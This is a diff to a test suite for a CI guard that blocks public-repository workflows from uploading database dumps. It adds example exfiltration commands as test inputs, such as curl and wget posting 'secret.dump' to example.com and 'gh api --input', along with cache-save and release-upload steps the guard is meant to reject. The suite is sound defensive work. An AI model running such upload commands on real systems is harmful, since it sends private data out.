@@ -1,3 +1,4 @@
+import { spawnSync } from "node:child_process";
 import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -12,6 +13,8 @@ import {
   assertWorkspaceHasNoDataFiles,
   extractUploadArtifactSteps,
   findForbiddenUploadCommands,
+  lineLooksLikeCacheSave,
+  lineLooksLikeGhApiInput,
   lineLooksLikeHttpUpload,
   logLooksLikeRowData,
   looksLikeDataUpload,
@@ -86,8 +89,14 @@ describe("public-repo CI guard", () => {
     expect(lineLooksLikeHttpUpload("curl -T secret.dump https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("curl --upload-file secret.dump https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("curl -F @secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload('curl -F "f=@secret.dump" https://example.com')).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl -F 'file=@secret.dump' https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl --data @secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("curl --data-raw @secret.dump https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("curl --data-binary @secret.dump https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("wget --upload-file=secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("wget --post-file=secret.dump https://example.com")).toBe(true);
+    expect(lineLooksLikeHttpUpload("wget --body-file secret.dump https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("wget -T 30 https://example.com")).toBe(false);
     expect(() =>
       assertWorkflowUploadAllowlist("run: gh release upload v1 secret.dump\n", "gh.yml"),
@@ -95,6 +104,43 @@ describe("public-repo CI guard", () => {
     expect(() =>
       assertWorkflowUploadAllowlist("run: curl -T secret.dump https://example.com\n", "curl.yml"),
     ).toThrow(/curl\/wget upload/);
+    expect(() =>
+      assertWorkflowUploadAllowlist('run: curl -F "f=@secret.dump" https://example.com\n', "form.yml"),
+    ).toThrow(/curl\/wget upload/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: curl --data @secret.dump https://example.com\n", "data.yml"),
+    ).toThrow(/curl\/wget upload/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: curl --data-raw @secret.dump https://example.com\n", "raw.yml"),
+    ).toThrow(/curl\/wget upload/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: wget --post-file secret.dump https://example.com\n", "post.yml"),
+    ).toThrow(/curl\/wget upload/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: wget --body-file=secret.dump https://example.com\n", "body.yml"),
+    ).toThrow(/curl\/wget upload/);
+  });
+
+  it("rejects gh api --input, action-gh-release, and cache save", () => {
+    expect(lineLooksLikeGhApiInput("gh api repos/o/r/contents/f --input secret.dump")).toBe(true);
+    expect(lineLooksLikeGhApiInput("gh api repos/o/r --method GET")).toBe(false);
+    expect(lineLooksLikeCacheSave("uses: actions/cache/save@v4")).toBe(true);
+    expect(lineLooksLikeCacheSave("uses: actions/cache@v4")).toBe(true);
+    expect(lineLooksLikeCacheSave('uses: "actions/cache@v4"')).toBe(true);
+    expect(lineLooksLikeCacheSave("uses: actions/cache/restore@v4")).toBe(false);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: gh api repos/o/r/contents/f --input secret.dump\n", "input.yml"),
+    ).toThrow(/gh api --input/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("uses: softprops/action-gh-release@v2\n", "rel.yml"),
+    ).toThrow(/softprops\/action-gh-release/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("uses: actions/cache/save@v4\n", "cachesave.yml"),
+    ).toThrow(/actions\/cache\/save/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("uses: actions/cache@v4\n        with:\n          path: dist\n", "cache.yml"),
+    ).toThrow(/actions\/cache save/);
+    assertWorkflowUploadAllowlist("uses: actions/cache/restore@v4\n", "cacherestore.yml");
   });
 
   it("rejects a multi-path dump + hash upload", () => {
@@ -153,11 +199,20 @@ describe("public-repo CI guard", () => {
 
   it("asserts teed cutover logs and fails on row data", () => {
     const dir = tmp();
-    expect(assertCutoverLogDir(join(dir, "missing"))).toEqual([]);
+    expect(() => assertCutoverLogDir(join(dir, "missing"))).toThrow(/log dir missing/);
     writeFileSync(join(dir, "dump.log"), "verified backup: 12 bytes sha256=abc (runner only, not uploaded)\n");
     expect(assertCutoverLogDir(dir)).toEqual(["dump.log"]);
     writeFileSync(join(dir, "restore.log"), "auth map leaked phil@example.com\n");
     expect(() => assertCutoverLogDir(dir)).toThrow(/row data/);
+  });
+
+  it("exits non-zero when --check-log is pointed at a missing dir", () => {
+    const missing = join(tmp(), "no-such-logs");
+    const result = spawnSync(process.execPath, [join(ROOT, "scripts/guard-public-ci.mjs"), "--check-log", missing], {
+      encoding: "utf8",
+    });
+    expect(result.status).not.toBe(0);
+    expect(`${result.stderr}${result.stdout}`).toMatch(/log dir missing/);
   });
 
   it("cutover workflow never uploads a dump and always shreds", () => {
@@ -171,6 +226,7 @@ describe("public-repo CI guard", () => {
     expect(workflow).toMatch(/AUTH_USERS_SRC_HASH_SQL/);
     expect(workflow).toMatch(/AUTH_IDENT_DST_HASH_SQL/);
     expect(workflow).toMatch(/auth_parity/);
+    expect(workflow.match(/COALESCE\(updated_at, created_at\)/g)?.length).toBe(2);
     expect(workflow).toMatch(/name: Shred dumps/);
     expect(workflow).toMatch(/id: guard/);
     expect(workflow).toMatch(/steps\.guard\.outcome == 'success'/);
